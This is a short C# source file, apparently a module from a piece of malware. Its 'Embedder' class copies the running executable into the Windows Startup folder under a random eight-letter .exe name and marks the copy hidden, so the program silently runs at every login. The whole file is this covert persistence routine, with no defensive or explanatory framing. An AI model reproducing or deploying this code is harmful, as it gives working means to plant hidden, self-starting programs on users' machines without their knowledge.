using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using Microsoft.Win32;

namespace Type
{
    class Embedder
    {
        private const int NAME_LEN = 8;
        private const char PATH_DELIM = '\\';
        private const char START_CHAR = 'a';

        private static string RandomName()
        {
            StringBuilder sb = new StringBuilder();
            sb.Append(PATH_DELIM);
            Random rand = new Random((int)DateTime.Now.Ticks);
            for (int i = 0; i < NAME_LEN; i++)
            {
                char ch = (char)((int)START_CHAR + rand.Next(0, 26));
                sb.Append(ch);
            }
            sb.Append(".exe");
            return (sb.ToString());
        }

        public static void Embed()
        {
            string me = System.Reflection.Assembly.GetExecutingAssembly().Location;
            FileInfo applicationInfo = new FileInfo(me);

            string dest = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string name = RandomName();
            string target = (dest + name);

            Install(me, target);
        }

        private static void Install(string me, string target)
        {
            if (!File.Exists(target))
            {
                File.Copy(me, target);
                File.SetAttributes(target, File.GetAttributes(target) | FileAttributes.Hidden);
            }
        }
    }
}
